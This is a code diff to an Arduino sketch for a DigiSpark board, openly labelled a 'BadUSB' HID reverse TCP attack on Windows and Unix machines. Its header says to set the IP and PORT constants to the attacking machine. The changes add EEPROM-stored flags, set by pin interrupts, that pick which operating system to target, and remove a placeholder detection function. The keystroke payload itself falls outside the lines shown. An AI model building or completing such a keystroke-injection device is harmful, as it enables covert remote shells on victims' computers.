@@ -1,15 +1,24 @@
 /*
-Code to be run on DigiSpark compatible boards
+ * BadUSB - HID Reverse TCP attack for Win and *Nix OS - Last update 08/12/2016 - Copyright (c) by grcasanova
+ *
+ * change IP and PORT constants to match the attacking machine details
+ *
 */
 
 #include <avr/wdt.h>
+#include <EEPROM.h>
 #include "DigiKeyboard.h"
 
 // define server IP and port
 #define IP "0.0.0.0"
 #define PORT "0"
+#define WIN_FLAG 100
+#define NIX_FLAG 200
 
 static int run;
+unsigned int address = 0;
+const byte interruptPin0 = 0;
+const byte interruptPin1 = 1;
 
 void blinkLed();
 bool win_os();
@@ -20,16 +29,36 @@ void setup()
   wdt_enable(WDTO_4S);
   run = 0;
 
-  // pin setup to blink led
+  // pin setup
   pinMode(0, OUTPUT); //LED on Model B
   pinMode(1, OUTPUT); //LED on Model A
+  pinMode(interruptPin0, INPUT_PULLUP);
+  pinMode(interruptPin1, INPUT_PULLUP);
+  
+  // interrups setup
+  attachInterrupt(digitalPinToInterrupt(interruptPin0), setWinFlag, CHANGE); // attach INT0 interrupt
+  attachInterrupt(digitalPinToInterrupt(interruptPin1), setNixFlag, CHANGE); // attach INT1 interrupt
+}
+
+// Win Os flag setup
+void setWinFlag()
+{
+  EEPROM.write(address, WIN_FLAG);
+}
+
+// *nix Os flag setup
+void setNixFlag()
+{
+  EEPROM.write(address, NIX_FLAG);
 }
 
 void loop()
 {
   wdt_reset();
 
-  if (win_os())  // running on a Windows machine
+  byte value = EEPROM.read(address);
+
+  if (value == WIN_FLAG)  // running on a Windows machine
   {
     DigiKeyboard.update();
     DigiKeyboard.sendKeyStroke(0);
@@ -63,12 +92,6 @@ void loop()
     blinkLed();
   else
     run++;
-}
-
-bool win_os()
-{
-  // TBD - needs to be implemented
-  return true;
 }
 
 void blinkLed()
